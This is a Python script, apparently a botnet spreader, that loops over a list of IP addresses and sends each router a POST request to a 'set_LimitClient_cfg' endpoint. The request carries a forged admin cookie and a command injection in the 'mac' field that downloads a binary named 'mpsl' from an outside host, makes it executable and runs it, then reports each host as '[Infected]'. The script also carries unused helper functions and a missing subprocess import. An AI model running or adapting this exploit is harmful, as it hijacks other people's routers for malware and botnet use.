import requests
import sys
import base64
import os

file_path = sys.argv[1]
def run(a):
    subprocess.run(a, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def all(kk):
    q = "ww" + str(kk)
    return q
with open(file_path, 'r') as file:
    ip_list = file.read().splitlines()

headers = {
    'Cookie': 'user=admin'
}

payload = "time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://1.1.1.1/mpsl; chmod 777 mpsl; ./mpsl lblink;"

for ip in ip_list:
    url = f'http://{ip}/goform/set_LimitClient_cfg'
     
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=20)
        if response.status_code == 200:
            print(f"[Infected] {ip}")
        else:
            print(f"[Error] {ip}")
    except requests.exceptions.Timeout:
        print(f"[Timeout] {ip}")
        continue
    except requests.exceptions.RequestException:
        print(f"[Error] {ip}")
        continue
